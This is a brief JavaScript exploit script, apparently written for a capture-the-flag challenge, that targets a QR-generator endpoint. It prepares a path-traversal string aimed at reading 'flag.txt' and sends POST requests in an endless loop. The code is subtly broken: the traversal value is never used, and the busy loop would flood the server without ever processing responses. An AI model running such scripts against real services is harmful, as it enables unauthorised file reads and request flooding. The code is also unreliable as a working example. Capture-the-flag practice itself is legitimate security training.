
function exploit(){
    console.log('here')
const url = 'http://qrcoder.challenges.hackfest.tn:8000/qr_generator';
const a = '//#/../flag.txt';
const b = 'http://abcde';

function req(d) {
    return fetch(url, {
        method:'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `url=${d}`
    });
}

while (true) {
    console.log('trying again')
    req(b).then(x => x.text()).then(x => {
        console.log('here')
        const endIndex= x.indexOf('">')
        x = x.slice(32,endIndex)
        console.log(x)
    })
 }
}

exploit()
